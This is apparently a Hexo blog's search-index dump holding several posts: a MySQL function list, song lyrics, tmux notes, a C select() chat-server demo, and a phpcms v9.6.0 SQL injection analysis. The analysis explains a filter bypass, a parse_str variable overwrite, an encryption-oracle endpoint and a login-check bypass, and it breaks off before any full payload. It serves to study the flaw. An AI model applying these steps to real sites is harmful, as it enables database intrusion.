u&apos;NOT BETWEEN ... AND ...&apos;, u&apos;!=, &lt;&gt;&apos;, u&apos;NOT IN()&apos;, u&apos;NOT LIKE&apos;, u&apos;NOT REGEXP&apos;, u&apos;NOW()&apos;, u&apos;NULLIF()&apos;, u&apos;NumGeometries()&apos;, u&apos;NumInteriorRings()&apos;, u&apos;NumPoints()&apos;, u&apos;OCT()&apos;, u&apos;OCTET_LENGTH()&apos;, u&apos;OLD_PASSWORD()&apos;, u&apos;||, OR&apos;, u&apos;ORD()&apos;, u&apos;Overlaps()&apos;, u&apos;PASSWORD()&apos;, u&apos;PERIOD_ADD()&apos;, u&apos;PERIOD_DIFF()&apos;, u&apos;PI()&apos;, u&apos;+&apos;, u&apos;Point()&apos;, u&apos;PointFromText()&apos;, u&apos;PointFromWKB()&apos;, u&apos;PointN()&apos;, u&apos;PolyFromText(), PolygonFromText()&apos;, u&apos;PolyFromWKB(), PolygonFromWKB()&apos;, u&apos;Polygon()&apos;, u&apos;POSITION()&apos;, u&apos;POW()&apos;, u&apos;POWER()&apos;, u&apos;PROCEDURE ANALYSE()&apos;, u&apos;QUARTER()&apos;, u&apos;QUOTE()&apos;, u&apos;RADIANS()&apos;, u&apos;RAND()&apos;, u&apos;REGEXP&apos;, u&apos;RELEASE_LOCK()&apos;, u&apos;REPEAT()&apos;, u&apos;REPLACE()&apos;, u&apos;REVERSE()&apos;, u&apos;RIGHT()&apos;, u&apos;&gt;&gt;&apos;, u&apos;RLIKE&apos;, u&apos;ROUND()&apos;, u&apos;ROW_COUNT()&apos;, u&apos;RPAD()&apos;, u&apos;RTRIM()&apos;, u&apos;SCHEMA()&apos;, u&apos;SEC_TO_TIME()&apos;, u&apos;SECOND()&apos;, u&apos;SESSION_USER()&apos;, u&apos;SHA1(), SHA()&apos;, u&apos;SHA2()&apos;, u&apos;SIGN()&apos;, u&apos;SIN()&apos;, u&apos;SLEEP()&apos;, u&apos;SOUNDEX()&apos;, u&apos;SOUNDS LIKE&apos;, u&apos;SPACE()&apos;, u&apos;SQRT()&apos;, u&apos;SRID()&apos;, u&apos;StartPoint()&apos;, u&apos;STD()&apos;, u&apos;STDDEV()&apos;, u&apos;STDDEV_POP()&apos;, u&apos;STDDEV_SAMP()&apos;, u&apos;STR_TO_DATE()&apos;, u&apos;STRCMP()&apos;, u&apos;SUBDATE()&apos;, u&apos;SUBSTR()&apos;, u&apos;SUBSTRING()&apos;, u&apos;SUBSTRING_INDEX()&apos;, u&apos;SUBTIME()&apos;, u&apos;SUM()&apos;, u&apos;SYSDATE()&apos;, u&apos;SYSTEM_USER()&apos;, u&apos;TAN()&apos;, u&apos;TIME()&apos;, u&apos;TIME_FORMAT()&apos;, u&apos;TIME_TO_SEC()&apos;, u&apos;TIMEDIFF()&apos;, u&apos;*&apos;, u&apos;TIMESTAMP()&apos;, u&apos;TIMESTAMPADD()&apos;, u&apos;TIMESTAMPDIFF()&apos;, u&apos;TO_DAYS()&apos;, u&apos;TO_SECONDS()&apos;, u&apos;Touches()&apos;, u&apos;TRIM()&apos;, u&apos;TRUNCATE()&apos;, u&apos;UCASE()&apos;, u&apos;-&apos;, u&apos;UNCOMPRESS()&apos;, u&apos;UNCOMPRESSED_LENGTH()&apos;, u&apos;UNHEX()&apos;, u&apos;UNIX_TIMESTAMP()&apos;, u&apos;UpdateXML()&apos;, u&apos;UPPER()&apos;, u&apos;USER()&apos;, u&apos;UTC_DATE()&apos;, u&apos;UTC_TIME()&apos;, u&apos;UTC_TIMESTAMP()&apos;, u&apos;UUID()&apos;, u&apos;UUID_SHORT()&apos;, u&apos;VALUES()&apos;, u&apos;VAR_POP()&apos;, u&apos;VAR_SAMP()&apos;, u&apos;VARIANCE()&apos;, u&apos;VERSION()&apos;, u&apos;WEEK()&apos;, u&apos;WEEKDAY()&apos;, u&apos;WEEKOFYEAR()&apos;, u&apos;Within()&apos;, u&apos;X()&apos;, u&apos;XOR&apos;, u&apos;Y()&apos;, u&apos;YEAR()&apos;, u&apos;YEARWEEK()&apos;] ABS() ACOS() ADDDATE() ADDTIME() AES_DECRYPT() AES_ENCRYPT() AND, &amp;&amp; Area() AsBinary(), AsWKB() ASCII() ASIN() = := AsText(), AsWKT() ATAN() ATAN2(), ATAN() AVG() BENCHMARK() BETWEEN ... AND ... BIN() BINARY BIT_AND() BIT_COUNT() BIT_LENGTH() BIT_OR() BIT_XOR() &amp; ~ | ^ CASE CAST() CEIL() CEILING() Centroid() CHAR() CHAR_LENGTH() CHARACTER_LENGTH() CHARSET() COALESCE() COERCIBILITY() COLLATION() COMPRESS() CONCAT() CONCAT_WS() CONNECTION_ID() Contains() CONV() CONVERT() CONVERT_TZ() COS() COT() COUNT() COUNT(DISTINCT) CRC32() Crosses() CURDATE() CURRENT_DATE(), CURRENT_DATE CURRENT_TIME(), CURRENT_TIME CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP CURRENT_USER(), CURRENT_USER CURTIME() DATABASE() DATE() DATE_ADD() DATE_FORMAT() DATE_SUB() DATEDIFF() DAY() DAYNAME() DAYOFMONTH() DAYOFWEEK() DAYOFYEAR() DECODE() DEFAULT() DEGREES() DES_DECRYPT() DES_ENCRYPT() Dimension() Disjoint() DIV / ELT() ENCODE() ENCRYPT() EndPoint() Envelope() = &lt;=&gt; Equals() EXP() EXPORT_SET() ExteriorRing() EXTRACT() ExtractValue() FIELD() FIND_IN_SET() FLOOR() FORMAT() FOUND_ROWS() FROM_DAYS() FROM_UNIXTIME() GeomCollFromText(), GeometryCollectionFromText() GeomCollFromWKB(), GeometryCollectionFromWKB() GeometryCollection() GeometryN() GeometryType() GeomFromText(), GeometryFromText() GeomFromWKB(), GeometryFromWKB() GET_FORMAT() GET_LOCK() GLength() &gt; &gt;= GREATEST() GROUP_CONCAT() HEX() HOUR() IF() IFNULL() IN() INET_ATON() INET_NTOA() INSERT() INSTR() InteriorRingN() Intersects() INTERVAL() IS IS_FREE_LOCK() IS NOT IS NOT NULL IS NULL IS_USED_LOCK() IsClosed() IsEmpty() ISNULL() IsSimple() LAST_DAY LAST_INSERT_ID() LCASE() LEAST() LEFT() &lt;&lt; LENGTH() &lt; &lt;= LIKE LineFromText(), LineStringFromText() LineFromWKB(), LineStringFromWKB() LineString() LN() LOAD_FILE() LOCALTIME(), LOCALTIME LOCALTIMESTAMP, LOCALTIMESTAMP() LOCATE() LOG() LOG10() LOG2() LOWER() LPAD() LTRIM() MAKE_SET() MAKEDATE() MAKETIME() MASTER_POS_WAIT() MATCH MAX() MBRContains() MBRDisjoint() MBREqual() MBRIntersects() MBROverlaps() MBRTouches() MBRWithin() MD5() MICROSECOND() MID() MIN() - MINUTE() MLineFromText(), MultiLineStringFromText() MLineFromWKB(), MultiLineStringFromWKB() MOD() %, MOD MONTH() MONTHNAME() MPointFromText(), MultiPointFromText() MPointFromWKB(), MultiPointFromWKB() MPolyFromText(), MultiPolygonFromText() MPolyFromWKB(), MultiPolygonFromWKB() MultiLineString() MultiPoint() MultiPolygon() NAME_CONST() NOT, ! NOT BETWEEN ... AND ... !=, &lt;&gt; NOT IN() NOT LIKE NOT REGEXP NOW() NULLIF() NumGeometries() NumInteriorRings() NumPoints() OCT() OCTET_LENGTH() OLD_PASSWORD() ||, OR ORD() Overlaps() PASSWORD() PERIOD_ADD() PERIOD_DIFF() PI() + Point() PointFromText() PointFromWKB() PointN() PolyFromText(), PolygonFromText() PolyFromWKB(), PolygonFromWKB() Polygon() POSITION() POW() POWER() PROCEDURE ANALYSE() QUARTER() QUOTE() RADIANS() RAND() REGEXP RELEASE_LOCK() REPEAT() REPLACE() REVERSE() RIGHT() &gt;&gt; RLIKE ROUND() ROW_COUNT() RPAD() RTRIM() SCHEMA() SEC_TO_TIME() SECOND() SESSION_USER() SHA1(), SHA() SHA2() SIGN() SIN() SLEEP() SOUNDEX() SOUNDS LIKE SPACE() SQRT() SRID() StartPoint() STD() STDDEV() STDDEV_POP() STDDEV_SAMP() STR_TO_DATE() STRCMP() SUBDATE() SUBSTR() SUBSTRING() SUBSTRING_INDEX() SUBTIME() SUM() SYSDATE() SYSTEM_USER() TAN() TIME() TIME_FORMAT() TIME_TO_SEC() TIMEDIFF() * TIMESTAMP() TIMESTAMPADD() TIMESTAMPDIFF() TO_DAYS() TO_SECONDS() Touches() TRIM() TRUNCATE() UCASE() - UNCOMPRESS() UNCOMPRESSED_LENGTH() UNHEX() UNIX_TIMESTAMP() UpdateXML() UPPER() USER() UTC_DATE() UTC_TIME() UTC_TIMESTAMP() UUID() UUID_SHORT() VALUES() VAR_POP() VAR_SAMP() VARIANCE() VERSION() WEEK() WEEKDAY() WEEKOFYEAR() Within() X() XOR Y() YEAR() YEARWEEK()","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"春夏秋冬的你","slug":"wmj","date":"2018-01-08T08:56:49.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/wmj/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/wmj/index.html","excerpt":"","text":"那年春天 我迷失在梦里 那年夏天 像她一样恬静 那年秋天的风 映入慌乱的耳际 那年冬天 身边缺了你 如果春天 梦里面没有你 如果夏天 街角遇不见你 就算秋天的风 带你回不到这里 我的心 就像 冰冷的冬季 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 那年春天 我迷失在梦里 那年夏天 像她一样恬静 那年秋天的风 映入慌乱的耳际 那年冬天 身边缺了你 如果春天 梦里面没有你 如果夏天 街角遇不见你 就算秋天的风 带你回不到这里 我的心 就像 冰冷的冬季 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 怎么去寻找 春天的轨迹 看着大雁 一起回归远方 心中想着 伴随 你的姑娘 看着落叶飘落 回到家乡的彷徨 保持着 习惯的想象","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"tmux快捷键记录","slug":"tmux-notes","date":"2017-12-24T15:00:48.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/tmux-notes/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/tmux-notes/index.html","excerpt":"","text":"进入tmux面板后，一定要先按ctrl+b，然后松开，再按其他的组合键才生效。 常用到的几个组合键： ctrl+b ? 显示快捷键帮助 ctrl+b 空格键 采用下一个内置布局，这个很有意思，在多屏时，用这个就会将多有屏幕竖着展示 ctrl+b ! 把当前窗口变为新窗口 ctrl+b “ 模向分隔窗口 ctrl+b % 纵向分隔窗口 ctrl+b q 显示分隔窗口的编号 ctrl+b o 跳到下一个分隔窗口。多屏之间的切换 ctrl+b 上下键 上一个及下一个分隔窗口 ctrl+b C-方向键 调整分隔窗口大小 ctrl+b &amp; 确认后退出当前tmux ctrl+b [ 复制模式，即将当前屏幕移到上一个的位置上，其他所有窗口都向前移动一个。 ctrl+b c 创建新窗口 ctrl+b n 选择下一个窗口 ctrl+b l 最后使用的窗口 ctrl+b p 选择前一个窗口 ctrl+b w 以菜单方式显示及选择窗口 ctrl+b s 以菜单方式显示和选择会话。这个常用到，可以选择进入哪个tmux ctrl+b t 显示时钟。然后按enter键后就会恢复到shell终端状态 ctrl+b d 脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"对select()的理解","slug":"thinkings-on-select","date":"2017-12-14T16:56:25.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/thinkings-on-select/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/thinkings-on-select/index.html","excerpt":"","text":"断断续续的看Beej’s Guide to Network Programming这本小册子,最近看了select函数的用法,感觉这个函数挺有用而且听特殊,理解上有点儿难度,因此记录下来关于这个函数的一些东西. 函数定义#include &lt;sys/time.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; int select(int numfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); fd_set这里的fd_set类型相当于一个file descriptor的集合.当select()函数返回时,readfs中只含有可以读的file descriptor.writefs包含可写的descriptor,exceptfds包含出错的file descriptor .(此三个参数不必都有) fd_set有一些列的操作函数: FD_SET(int fd, fd_set *set); //Add fd to the set . FD_CLR(int fd, fd_set *set); //Remove fd from the set . FD_ISSET(int fd, fd_set *set); //Return true if fd is in the set . FD_ZERO(fd_set *set); //Clear all entries from the set . timeval结构体struct timeval { int tv_sec; //seconds int tv_usec;// microseconds }; 此结构体表示select函数的超时时间.设置为NULL则永远等待. 此函数使用时,numfds应设置为最高的file descriptor的值. 返回值返回set中最后剩下的的数目.0表示超时,-1表示出错. 此函数如何使用的理解我们可以在开始的时候使用FD_SET将我们创建的服务端套接字描述符填入一个fd_set中,然后把这个fd_set复制一下传如select的readfds参数中然后用select监听,select有返回值后则遍历所有descriptors 如果这个descriptor在这个新的readfds中(FD_ISSET)则说明可以read 如果这个descriptor正好是我们最初的那个服务端套接字 则可以进行accept操作,然后将读到的这个socksetfd就可以传入我们的fd_set中,判断这个socketfd是否比原有的最大的socketfd大,大则替换select()函数的第一个参数为这个新的socketfd+1. 如果这个descriptor不是最初的那个服务端套接字 则说明是与某个主机的一个连接,则可以调用这个套接字的recv()方法接收数据,如果返回0说明这个套接字已经断开,可调用FD_CLR将其从最初的fd_set中清除出去.否则则进行其他的一些列操作. 一个简单的demo/* ** ChatServer.cpp - a practise on select() */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netdb.h&gt; #define PORT &quot;3456&quot; #define STDIN 0 void *get_in_addr(struct sockaddr *sa) { if (sa-&gt;sa_family == AF_INET) { return &amp;(((struct sockaddr_in *)sa)-&gt;sin_addr); } else return &amp;(((struct sockaddr_in6 *)sa)-&gt;sin6_addr); } int main(void) { fd_set master; fd_set read_fds; int fd_max; int listener; int newfd; struct sockaddr_storage remoteaddr; socklen_t addrlen; char buf[256]; char mess[256]; int nbytes; char remoteIP[INET6_ADDRSTRLEN]; int yes = 1; int i, j, rv; struct addrinfo hints, *ai, *p; FD_ZERO(&amp;master); FD_ZERO(&amp;read_fds); memset(&amp;hints, 0, sizeof hints); hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE; if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;ai)) != 0) { fprintf(stderr, &quot;selectserver:%s\\n&quot;, gai_strerror(rv)); exit(1); } for (p = ai; p != NULL; p = p-&gt;ai_next) { listener = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol); if (listener &lt; 0) { continue; } setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int)); if (bind(listener, p-&gt;ai_addr, p-&gt;ai_addrlen) &lt; 0) { close(listener); continue; } break; } if (p == NULL) { fprintf(stderr, &quot;selectserver: failed to bind\\n&quot;); exit(2); } freeaddrinfo(ai); if (listen(listener, 10) == -1) { perror(&quot;listen&quot;); exit(3); } FD_SET(listener, &amp;master); FD_SET(STDIN, &amp;master); fd_max = listener &gt; STDIN ? listener : STDIN; for (;;) { read_fds = master; if (select(fd_max + 1, &amp;read_fds, NULL, NULL, NULL) == -1) { perror(&quot;select&quot;); exit(4); } for (i = 0; i &lt;= fd_max; i++) { if (FD_ISSET(i, &amp;read_fds)) { //we got one!! if (i == STDIN) { fgets(buf, sizeof buf, stdin); memset(mess, 0, sizeof mess); sprintf(mess, &quot;server said:%s&quot;, buf); for (j = 0; j &lt;= fd_max; j++) { if (FD_ISSET(j, &amp;master)) { if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN) { if (send(j, mess, strlen(mess), 0) == -1) { perror(&quot;send&quot;); } } } } } else if (i == listener) { addrlen = sizeof remoteaddr; newfd = accept(listener, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen); if (newfd == -1) { perror(&quot;accept&quot;); } else { FD_SET(newfd, &amp;master); if (newfd &gt; fd_max) { fd_max = newfd; } printf(&quot;selectserver:new connection from %s on socket %d\\n&quot;, inet_ntop(remoteaddr.ss_family, get_in_addr((struct sockaddr *)&amp;remoteaddr), remoteIP, INET6_ADDRSTRLEN), newfd); sprintf(buf, &quot;hello!!! your socket id is %d\\n&quot;, newfd); if (send(newfd, buf, strlen(buf), 0) == -1) { perror(&quot;send&quot;); } sprintf(buf, &quot;socket %d joined chatroom\\n&quot;, newfd); for (j = 0; j &lt; fd_max; j++) { if (FD_ISSET(j, &amp;master)) { if (j != i &amp;&amp; j != listener &amp;&amp; j != STDIN) { if (send(j, buf, strlen(buf), 0) == -1) perror(&quot;send&quot;); } } } } } else { if ((nbytes = recv(i, buf, sizeof buf, 0)) &lt;= 0) { if (nbytes == 0) { sprintf(buf, &quot;select server: socket %d hung up\\n&quot;, i); printf(&quot;%s&quot;, buf); for (j = 0; j &lt;= fd_max; j++) { if (FD_ISSET(j, &amp;master)) if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN) { if (send(j, buf, strlen(buf), 0) == -1) { perror(&quot;send&quot;); } } } } else { perror(&quot;recv&quot;); } close(i); FD_CLR(i, &amp;master); } else { if (nbytes &lt;= 2) nbytes = 3; memset(mess, 0, sizeof mess); strncpy(mess, buf, nbytes - 2); printf(&quot;recv data %s from socket %d\\n&quot;, mess, i); sprintf(buf, &quot;socket %d says: %s\\n&quot;, i, mess); for (j = 0; j &lt;= fd_max; j++) { if (FD_ISSET(j, &amp;master)) { if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN) { if (send(j, buf, strlen(buf), 0) == -1) { perror(&quot;send&quot;); } } } } } } } } } return 0; } 要特别注意一次select操作后readfs中只剩下了当前可读的fd.所以每次要复制一个副本穿进去. 题外话还是认真学习认真思考能让人不那么丧…..庆幸自己找到了自己真正的兴趣所在.不要让一些没意义的东西麻痹了自己. 要时刻提醒自己生存不易.不高兴了就更更博,耐心看看技术书,让自己静一静.闲了就容易生事.keep on moving!!!","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"人生杂谈","slug":"Ctf/人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/人生杂谈/"},{"name":"技术学习","slug":"Ctf/人生杂谈/技术学习","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/人生杂谈/技术学习/"}],"tags":[]},{"title":"phpcms-v9.6.0sql注入漏洞分析[挖坟]","slug":"phpcmsv9sqli","date":"2017-12-06T13:29:14.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/phpcmsv9sqli/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/phpcmsv9sqli/index.html","excerpt":"","text":"还有几天就要翘课一个礼拜去深圳和厦门被各位大佬虐菜了…由于本菜鸡的代码审计一直是弱项,所以为了能打好这场比赛,这两天便找了一些代码和漏洞分析文章来学习学习.今天玩了一下这个好几个月之前的phpcms的漏洞,在差不多搞了个大概之后写了这篇文章来记录一下这个漏洞的原理. 0x01 phpcms的路由处理方式index.php中,可以看到调用了pc_base::create_app()方法.跟进这个方法最后调用了_load_class()函数,参数为application. private static function _load_class($classname, $path = &apos;&apos;, $initialize = 1) { static $classes = array(); if (empty($path)) $path = &apos;libs&apos;.DIRECTORY_SEPARATOR.&apos;classes&apos;; $key = md5($path.$classname); if (isset($classes[$key])) { if (!empty($classes[$key])) { return $classes[$key]; } else { return true; } } if (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) { include PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;; $name = $classname; if ($my_path = self::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) { include $my_path; $name = &apos;MY_&apos;.$classname; } if ($initialize) { $classes[$key] = new $name; } else { $classes[$key] = true; } return $classes[$key]; } else { return false; } } 跟进phpcms/libs/classes/application.class.php文件中 &lt;?php /** * application.class.php PHPCMS应用程序创建类 * * @copyright (C) 2005-2010 PHPCMS * @license http://www.phpcms.cn/license/ * @lastmodify 2010-6-7 */ class application { /** * 构造函数 */ public function __construct() { $param = pc_base::load_sys_class(&apos;param&apos;); define(&apos;ROUTE_M&apos;, $param-&gt;route_m()); define(&apos;ROUTE_C&apos;, $param-&gt;route_c()); define(&apos;ROUTE_A&apos;, $param-&gt;route_a()); $this-&gt;init(); } /** * 调用件事 */ private function init() { $controller = $this-&gt;load_controller(); if (method_exists($controller, ROUTE_A)) { if (preg_match(&apos;/^[_]/i&apos;, ROUTE_A)) { exit(&apos;You are visiting the action is to protect the private action&apos;); } else { call_user_func(array($controller, ROUTE_A)); } } else { exit(&apos;Action does not exist.&apos;); } } /** * 加载控制器 * @param string $filename * @param string $m * @return obj */ private function load_controller($filename = &apos;&apos;, $m = &apos;&apos;) { if (empty($filename)) $filename = ROUTE_C; if (empty($m)) $m = ROUTE_M; $filepath = PC_PATH.&apos;modules&apos;.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.&apos;.php&apos;; if (file_exists($filepath)) { $classname = $filename; include $filepath; if ($mypath = pc_base::my_path($filepath)) { $classname = &apos;MY_&apos;.$filename; include $mypath; } if(class_exists($classname)){ return new $classname; }else{ exit(&apos;Controller does not exist.&apos;); } } else { exit(&apos;Controller does not exist.&apos;); } } } 可以看到构造函数中将param的route_m,route_c,route_a作为为模块名,控制器,控制器的相关函数,然后调用init函数加载这个模块的相应控制器的相应函数.跟进/phpcms/libs/classes/param.class.php文件可以得知这三个成员变量分别来自$_GET[&#39;m&#39;],$_GET[&#39;c&#39;],$_GET[&#39;a&#39;]中. 由此可确定phpcms的路由规则:index.php?m=module名称&amp;c=controller名称&amp;a=函数 0x02 注入漏洞分析phpcms中负责过滤的一个函数safe_replace源码如下: function safe_replace($string) { $string = str_replace(&apos;%20&apos;,&apos;&apos;,$string); $string = str_replace(&apos;%27&apos;,&apos;&apos;,$string); $string = str_replace(&apos;%2527&apos;,&apos;&apos;,$string); $string = str_replace(&apos;*&apos;,&apos;&apos;,$string); $string = str_replace(&apos;&quot;&apos;,&apos;&quot;&apos;,$string); $string = str_replace(&quot;&apos;&quot;,&apos;&apos;,$string); $string = str_replace(&apos;&quot;&apos;,&apos;&apos;,$string); $string = str_replace(&apos;;&apos;,&apos;&apos;,$string); $string = str_replace(&apos;&lt;&apos;,&apos;&lt;&apos;,$string); $string = str_replace(&apos;&gt;&apos;,&apos;&gt;&apos;,$string); $string = str_replace(&quot;{&quot;,&apos;&apos;,$string); $string = str_replace(&apos;}&apos;,&apos;&apos;,$string); $string = str_replace(&apos;\\\\&apos;,&apos;&apos;,$string); return $string; } 可以看到这个函数是可以绕过的,只要传参%*27即可绕过过滤. 注入点这个漏洞的注入点位于phpcms/modules/content/down.php文件中,代码如下: public function init() { $a_k = trim($_GET[&apos;a_k&apos;]); if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;)); $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;)); if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;)); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;)); if(!isset($modelid)||!isset($catid)) showmessage(L(&apos;illegal_parameters&apos;)); if(empty($f)) showmessage(L(&apos;url_invalid&apos;)); $allow_visitor = 1; $MODEL = getcache(&apos;model&apos;,&apos;commons&apos;); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&apos;tablename&apos;]; $this-&gt;db-&gt;table_name = $tablename.&apos;_data&apos;; $rs = $this-&gt;db-&gt;get_one(array(&apos;id&apos;=&gt;$id)); $siteids = getcache(&apos;category_content&apos;,&apos;commons&apos;); $siteid = $siteids[$catid]; $CATEGORYS = getcache(&apos;category_content_&apos;.$siteid,&apos;commons&apos;); 可以看到$a_k变量可控,对$a_k变量做一系列处理之后使用parse_str函数进行处理,这也是这个漏洞产生的一个重要原因.之后的几个变量都可以覆盖过去,可以看到$id变量被直接传递到了get_one函数中.跟进phpcms处理model相关的文件中/phpcms/libs/classes/db_access.class.php: /** * 获取单条记录查询 * @param $where 查询条件 * @param $data 需要查询的字段值[例`name`,`gender`,`birthday`] * @param $order 排序方式 [默认按数据库默认方式排序] * @param $group 分组方式 [默认为空] * @return array/null 数据查询结果集,如果不存在，则返回空 */ final public function get_one($where = &apos;&apos;, $data = &apos;*&apos;, $order = &apos;&apos;, $group = &apos;&apos;) { if (is_array($where)) $where = $this-&gt;sqls($where); return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group); } /** * 将数组转换为SQL语句 * @param array $where 要生成的数组 * @param string $font 连接串。 */ final public function sqls($where, $font = &apos; AND &apos;) { if (is_array($where)) { $sql = &apos;&apos;; foreach ($where as $key=&gt;$val) { $sql .= $sql ? &quot; $font `$key` = &apos;$val&apos; &quot; : &quot; `$key` = &apos;$val&apos;&quot;; } return $sql; } else { return $where; } } 调用get_one函数,跟进文件/phpcms/libs/classes/db_mysqli.class.php中 /** * 获取单条记录查询 * @param $data 需要查询的字段值[例`name`,`gender`,`birthday`] * @param $table 数据表 * @param $where 查询条件 * @param $order 排序方式 [默认按数据库默认方式排序] * @param $group 分组方式 [默认为空] * @return array/null 数据查询结果集,如果不存在，则返回空 */ public function get_one($data, $table, $where = &apos;&apos;, $order = &apos;&apos;, $group = &apos;&apos;) { $where = $where == &apos;&apos; ? &apos;&apos; : &apos; WHERE &apos;.$where; $order = $order == &apos;&apos; ? &apos;&apos; : &apos; ORDER BY &apos;.$order; $group = $group == &apos;&apos; ? &apos;&apos; : &apos; GROUP BY &apos;.$group; $limit = &apos; LIMIT 1&apos;; $field = explode( &apos;,&apos;, $data); array_walk($field, array($this, &apos;add_special_char&apos;)); $data = implode(&apos;,&apos;, $field); $sql = &apos;SELECT &apos;.$data.&apos; FROM `&apos;.$this-&gt;config[&apos;database&apos;].&apos;`.`&apos;.$table.&apos;`&apos;.$where.$group.$order.$limit; $this-&gt;execute($sql); $res = $this-&gt;fetch_next(); $this-&gt;free_result(); return $res; } 可以看到最终$id被直接拼接到了sql语句中.因此可以进行注入.那么怎么控制$id的值? 回到down.php文件中 public function init() { $a_k = trim($_GET[&apos;a_k&apos;]); if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;)); $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;)); if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;)); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); 可以看到这个$a_k是从$_GET[&#39;a_k&#39;]解密得来的.只要找到一个加密的点即可控制输出. 加密点这里师傅们用的加密的点是/phpcms/modules/attachment/attachments.php文件中的函数swfupload_json. /** * 设置swfupload上传的json格式cookie */ public function swfupload_json() { $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]); $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;])); $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie(&apos;att_json&apos;); $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) { return true; } else { $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str; param::set_cookie(&apos;att_json&apos;,$json_str); return true; } } 在这个函数中,将$_GET[‘src’]使用safe_replace()函数处理后进入$arr[‘src’]中,再对$arr进行json_encode,只要不存在att_json这样一个cookie或者$json_str不在数组中就会进入else的循环中,而跟进set_cookie函数则可发现phpcms输出的cookie值正好为加密后的cookie.因此我们便可以利用这个点来加密我们的注入语句. 然而phpcms的attachments类会进行一个用户身份的判断 function __construct() { pc_base::load_app_func(&apos;global&apos;); $this-&gt;upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;); $this-&gt;upload_path = pc_base::load_config(&apos;system&apos;,&apos;upload_path&apos;); $this-&gt;imgext = array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;jpeg&apos;); $this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;)); $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&apos;roleid&apos;] ? 1 : 0; $this-&gt;groupid = param::get_cookie(&apos;_groupid&apos;) ? param::get_cookie(&apos;_groupid&apos;) : 8; //判断是否登录 if(empty($this-&gt;userid)){ showmessage(L(&apos;please_login&apos;,&apos;&apos;,&apos;member&apos;)); } } 这里通过判断$this-&gt;userid来测试用户是否登录,可以发现userid除了可以来自于cookie外还可以来自于$_POST[‘userid_flash’]中. 